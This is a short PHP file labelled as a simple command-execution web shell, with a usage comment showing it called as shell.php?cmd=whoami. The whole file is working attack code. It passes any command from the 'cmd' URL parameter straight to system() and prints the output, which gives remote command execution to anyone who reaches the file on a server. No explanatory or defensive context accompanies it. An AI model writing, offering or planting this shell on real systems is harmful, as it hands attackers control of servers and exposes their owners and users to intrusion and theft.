<?php
// Simple command execution webshell
// Usage: shell.php?cmd=whoami

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
